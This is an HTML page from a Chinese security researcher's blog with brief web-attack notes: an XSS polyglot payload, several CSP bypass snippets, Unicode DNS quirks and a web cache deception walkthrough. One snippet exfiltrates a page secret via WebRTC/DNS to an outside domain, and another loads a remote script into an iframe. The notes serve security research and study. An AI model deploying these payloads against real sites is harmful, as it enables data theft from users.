@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    <title>一些思路和想法 | 5alt&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="X-HTTP-Method-Override在有反向代理型 WAF 站中用X-HTTP-Method-Override可能能发送 PUT 等请求 xss payload11 &amp;apos;&amp;quot;\&amp;apos;\&amp;quot; onmouseover=alert`0` &amp;lt;/title&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;/style&amp;gt;&amp;lt;/scRipt/--!&amp;gt;&amp;">
+<meta property="og:type" content="website">
+<meta property="og:title" content="一些思路和想法">
+<meta property="og:url" content="http://5alt.me/learn/201810.html">
+<meta property="og:site_name" content="5alt&#39;s Blog">
+<meta property="og:description" content="X-HTTP-Method-Override在有反向代理型 WAF 站中用X-HTTP-Method-Override可能能发送 PUT 等请求 xss payload11 &amp;apos;&amp;quot;\&amp;apos;\&amp;quot; onmouseover=alert`0` &amp;lt;/title&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;/style&amp;gt;&amp;lt;/scRipt/--!&amp;gt;&amp;">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-08-16T04:24:28.939Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一些思路和想法">
+<meta name="twitter:description" content="X-HTTP-Method-Override在有反向代理型 WAF 站中用X-HTTP-Method-Override可能能发送 PUT 等请求 xss payload11 &amp;apos;&amp;quot;\&amp;apos;\&amp;quot; onmouseover=alert`0` &amp;lt;/title&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;/style&amp;gt;&amp;lt;/scRipt/--!&amp;gt;&amp;">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="5alt&#39;s Blog" type="application/atom+xml">
+    
+
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/open-sans/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+    
+    
+    
+        <script type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-61217444-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+    
+    
+    
+
+
+</head>
+</html>
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">5alt&#39;s Blog</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/.">主页</a>
+                
+                    <a class="main-nav-link" href="/archives">归档</a>
+                
+                    <a class="main-nav-link" href="/about">关于我</a>
+                
+                    <a class="main-nav-link" href="/learn">Learn</a>
+                
+                    <a class="main-nav-link" href="/wiki">WIKI</a>
+                
+                    <a class="main-nav-link" href="/tools">小工具</a>
+                
+                    <a class="main-nav-link" href="/talks">Talks</a>
+                
+            </nav>
+            
+                
+                <nav id="sub-nav">
+                    <div class="profile" id="profile-nav">
+                        <a id="profile-anchor" href="javascript:;">
+                            <img class="avatar" src="/css/images/avatar.png" />
+                            <i class="fa fa-caret-down"></i>
+                        </a>
+                    </div>
+                </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="想要查找什么..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/.">主页</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">归档</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">关于我</a></td>
+                
+                    <td><a class="main-nav-link" href="/learn">Learn</a></td>
+                
+                    <td><a class="main-nav-link" href="/wiki">WIKI</a></td>
+                
+                    <td><a class="main-nav-link" href="/tools">小工具</a></td>
+                
+                    <td><a class="main-nav-link" href="/talks">Talks</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+                
+
+<aside id="profile">
+    <div class="inner profile-inner">
+        <div class="base-info profile-block">
+            <img id="avatar" src="/css/images/avatar.png" />
+            <h2 id="name">md5_salt</h2>
+            <h3 id="title">Researcher</h3>
+            <span id="location"><i class="fa fa-map-marker"></i>Beijing, China</span>
+            <a id="follow" target="_blank" href="https://github.com/5alt/">关注我</a>
+        </div>
+        <div class="article-info profile-block">
+            <div class="article-info-block">
+                29
+                <span>文章</span>
+            </div>
+            <div class="article-info-block">
+                0
+                <span>标签</span>
+            </div>
+        </div>
+        
+        <div class="profile-block social-links">
+            <table>
+                <tr>
+                    
+                    
+                    <td>
+                        <a href="https://github.com/5alt/" target="_blank" title="github" class=tooltip>
+                            <i class="fa fa-github"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="https://twitter.com/md5_salt" target="_blank" title="twitter" class=tooltip>
+                            <i class="fa fa-twitter"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="/atom.xml" target="_blank" title="rss" class=tooltip>
+                            <i class="fa fa-rss"></i>
+                        </a>
+                    </td>
+                    
+                </tr>
+            </table>
+        </div>
+        
+    </div>
+</aside>
+
+            
+            <section id="main"><article id="page-undefined" class="article article-type-page" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+            一些思路和想法
+        </h1>
+    
+
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <h2 id="X-HTTP-Method-Override"><a href="#X-HTTP-Method-Override" class="headerlink" title="X-HTTP-Method-Override"></a>X-HTTP-Method-Override</h2><p>在有反向代理型 WAF 站中用<code>X-HTTP-Method-Override</code>可能能发送 PUT 等请求</p>
+<h2 id="xss-payload"><a href="#xss-payload" class="headerlink" title="xss payload"></a>xss payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &apos;&quot;\&apos;\&quot; onmouseover=alert`0` &lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/scRipt/--!&gt;&lt;img/src/onerror=&apos;;alert(0);&apos;&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="csp-绕过"><a href="#csp-绕过" class="headerlink" title="csp 绕过"></a>csp 绕过</h2><h3 id="RTCPeerConnection-DNS-传输数据"><a href="#RTCPeerConnection-DNS-传输数据" class="headerlink" title="RTCPeerConnection + DNS 传输数据"></a>RTCPeerConnection + DNS 传输数据</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.addEventListener(<span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> peerConn=<span class="keyword">new</span> RTCPeerConnection(&#123;<span class="string">'iceServers'</span>:[&#123;<span class="string">'urls'</span>:[<span class="string">'stun:'</span>+<span class="built_in">window</span>.btoa(<span class="built_in">document</span>.getElementById(<span class="string">"secret"</span>).innerHTML).replace(<span class="string">'/'</span>, <span class="string">'-'</span>).replace(<span class="string">' '</span>, <span class="string">'_'</span>)+<span class="string">'.stackoff.com:19302'</span>]&#125;]&#125;);<span class="keyword">var</span> dataChannel=peerConn.createDataChannel(<span class="string">'xfucker'</span>);peerConn.createOffer(&#123;&#125;);peerConn.createOffer(&#123;&#125;).then(<span class="function">(<span class="params">desc</span>)=&gt;</span>peerConn.setLocalDescription(desc))&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="iframe-其他页面来绕过csp"><a href="#iframe-其他页面来绕过csp" class="headerlink" title="iframe 其他页面来绕过csp"></a>iframe 其他页面来绕过csp</h3><p>静态文件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">frame=<span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">frame.src=<span class="string">'/css/bootstrap.min.css'</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(frame);</span><br><span class="line"></span><br><span class="line">script=<span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">script.src=<span class="string">'//bo0om.ru/csp.js'</span>;</span><br><span class="line"><span class="built_in">window</span>.frames[<span class="number">0</span>].document.head.appendChild(script);</span><br></pre></td></tr></table></figure></p>
+<p>400 页面<br>query on level above it at /../ To prevent the browser from normalizing the request and replacing /../ with /, we will use unicode for the dots and the last slash.<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">frame=<span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">frame.src=<span class="string">'/%2e%2e%2f'</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(frame);</span><br></pre></td></tr></table></figure></p>
+<p>passing and incorrect unicode path, i.e. /% or /%%z</p>
+<p>A standard default url length handled by such web-servers and NGINX &amp; Apache is set not to exceed 8kB.<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">frame=<span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">frame.src=<span class="string">'/'</span>+<span class="string">'A'</span>.repeat(<span class="number">20000</span>);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(frame);</span><br></pre></td></tr></table></figure></p>
+<p>browsers support more and longer cookies than web-servers can handle<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;<span class="built_in">document</span>.cookie=i+<span class="string">"="</span>+<span class="string">"a"</span>.repeat(<span class="number">4000</span>)&#125;;f=<span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);f.id=<span class="string">"pwn"</span>;f.src=<span class="string">"/"</span>;f.onload=<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;<span class="built_in">document</span>.cookie=i+<span class="string">"="</span>&#125;;x=<span class="built_in">document</span>.createElement(<span class="string">'script'</span>);x.src=<span class="string">'data:,alert("Pwned "+top.secret.textContent)'</span>;pwn.contentWindow.document.body.appendChild(x)&#125;;<span class="built_in">document</span>.body.appendChild(f);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="java-调试端口"><a href="#java-调试端口" class="headerlink" title="java 调试端口"></a>java 调试端口</h2><p><a href="https://github.com/IOActive/jdwp-shellifier" target="_blank" rel="noopener">https://github.com/IOActive/jdwp-shellifier</a></p>
+<h2 id="dns-中-Unicode"><a href="#dns-中-Unicode" class="headerlink" title="dns 中 Unicode"></a>dns 中 Unicode</h2><p>dns 会把 Unicode 转成 ASCII</p>
+<p><code>curl -i http://sss.exp.5ａlt.me:9999</code> 收到 DNS <code>sss.exp.5alt.me</code><br><code>curl -i http://www.bａidu.com.exp.5alt.me:9999</code> 收到 DNS <code>www.baidu.com.exp.5alt.me</code> 和 <code>www.bａidu.com.exp.5alt.me</code></p>
+<p>不过在实际发送 http 请求的时候，请求头的 host 字段还是之前的样子。NGINX遇到Unicode的头会400。</p>
+<p>在浏览器里会都转换完再发请求。</p>
+<p><a href="https://en.wikipedia.org/wiki/Unicode_equivalence" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Unicode_equivalence</a></p>
+<h2 id="web-缓存"><a href="#web-缓存" class="headerlink" title="web 缓存"></a>web 缓存</h2><p>假设客户端请求<a href="http://www.example.com/home.php/nonexistent.css" target="_blank" rel="noopener">http://www.example.com/home.php/nonexistent.css</a> 这个URL，其中home.php是真实存在的，而nonexistent.css不存在，那WEB服务器会怎么处理呢？针对这种情况的处理跟WEB服务器用的技术以及配置相关，有的会返回404 not found，有的会返回200 OK，然后把home.php返回回来。如果服务器返回200 OK就要注意了，这时缓存服务器拿到的请求是<a href="http://www.example.com/home.php/nonexistent.css，是一个静态页面，而WEB服务器返回给缓存服务器的结果是http://www.example.com/home.php，不是一个静态页面，但是缓存服务器并不知道。" target="_blank" rel="noopener">http://www.example.com/home.php/nonexistent.css，是一个静态页面，而WEB服务器返回给缓存服务器的结果是http://www.example.com/home.php，不是一个静态页面，但是缓存服务器并不知道。</a></p>
+<ol>
+<li>攻击者引诱已登录的用户（受害者）访问<a href="https://www.bank.com/account.do/logo.png" target="_blank" rel="noopener">https://www.bank.com/account.do/logo.png</a></li>
+<li>受害者请求<a href="https://www.bank.com/account.do/logo.png" target="_blank" rel="noopener">https://www.bank.com/account.do/logo.png</a></li>
+<li>缓存服务器接收到请求，没查到这个页面，于是向WEB服务器请求</li>
+<li>WEB服务器返回<a href="https://www.bank.com/account.do，状态码是200" target="_blank" rel="noopener">https://www.bank.com/account.do，状态码是200</a> OK</li>
+<li>缓存服务器收到结果，由于状态码是200 OK，会认为URL保持不变，然后由于这个URL以.png结尾，认为它是一个静态文件，于是会缓存这个文件</li>
+<li>受害者得到正常结果</li>
+<li>攻击者访问<a href="https://www.bank.com/account.do/logo.png，请求到达缓存服务器，缓存服务器直接返回受害者的缓存账户页面给攻击者，攻击完成。" target="_blank" rel="noopener">https://www.bank.com/account.do/logo.png，请求到达缓存服务器，缓存服务器直接返回受害者的缓存账户页面给攻击者，攻击完成。</a></li>
+</ol>
+<p>需要条件</p>
+<ol>
+<li>WEB服务器会将类似<a href="http://www.example.com/home.php/nonexistent.css这种页面解析为home.php" target="_blank" rel="noopener">http://www.example.com/home.php/nonexistent.css这种页面解析为home.php</a></li>
+<li>缓存服务器会无视http header，只根据文件后缀来判断是否缓存该文件</li>
+<li>受害者访问该页面时必须已登录</li>
+</ol>
+
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="http://5alt.me/learn/201810.html" data-id="cjzj8jsy60011gnpjqyhrw2wu" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="http://5alt.me/learn/201810.html#comments" class="article-comment-link disqus-comment-count" data-disqus-url="http://5alt.me/learn/201810.html">评论</a>
+    
+
+        </footer>
+    </div>
+    
+        
+
+    
+</article>
+
+
+    
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+
+
+    
+    </section>
+
+</section>
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">最新文章</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2019/02/xss-in-azure-devops/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/web/">web</a></p>
+                            <p class="item-title"><a href="/2019/02/xss-in-azure-devops/" class="title">How I alert(1) in Azure DevOps</a></p>
+                            <p class="item-date"><time datetime="2019-02-25T16:00:00.000Z" itemprop="datePublished">2019-02-26</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/08/某开发工具沙箱绕过导致RCE/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/奇技淫巧/">奇技淫巧</a></p>
+                            <p class="item-title"><a href="/2018/08/某开发工具沙箱绕过导致RCE/" class="title">某开发工具沙箱绕过导致RCE</a></p>
+                            <p class="item-date"><time datetime="2018-07-31T16:00:00.000Z" itemprop="datePublished">2018-08-01</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/04/批量扫描智能合约中的整数溢出问题/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/以太坊/">以太坊</a></p>
+                            <p class="item-title"><a href="/2018/04/批量扫描智能合约中的整数溢出问题/" class="title">批量扫描智能合约中的整数溢出问题</a></p>
+                            <p class="item-date"><time datetime="2018-04-25T16:00:00.000Z" itemprop="datePublished">2018-04-26</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/04/weblogic反序列化漏洞分析与调试/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/web/">web</a></p>
+                            <p class="item-title"><a href="/2018/04/weblogic反序列化漏洞分析与调试/" class="title">weblogic反序列化漏洞分析与调试</a></p>
+                            <p class="item-date"><time datetime="2018-04-19T16:00:00.000Z" itemprop="datePublished">2018-04-20</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/04/业务逻辑中的session问题/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/web/">web</a></p>
+                            <p class="item-title"><a href="/2018/04/业务逻辑中的session问题/" class="title">业务逻辑中的session问题</a></p>
+                            <p class="item-date"><time datetime="2018-04-16T16:00:00.000Z" itemprop="datePublished">2018-04-17</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">分类</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/fun/">fun</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/radio/">radio</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">15</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/云安全/">云安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/以太坊/">以太坊</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/奇技淫巧/">奇技淫巧</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂/">杂</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/逆向/">逆向</a><span class="category-list-count">2</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">归档</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">四月 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">二月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">一月 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">七月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">六月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">二月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">一月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">十二月 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">十一月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">十月 2016</a><span class="archive-list-count">2</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    
+        
+    
+        
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">链接</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="http://5alt.me">5alt</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://mohamoha.club">么哈么哈</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://www.yulegeyu.com">雨了个雨</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2019 md5_salt<br>
+        </div>
+    </div>
+</footer>
+
+        
+    
+    <script>
+    var disqus_config = function () {
+        
+            this.page.url = 'http://5alt.me/learn/201810.html';
+        
+        this.page.identifier = 'undefined';
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://5alts-blog.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+        })();
+</script>
+
+
+
+
+    
+        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+    
+    
+
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div>
+</body>
+</html>
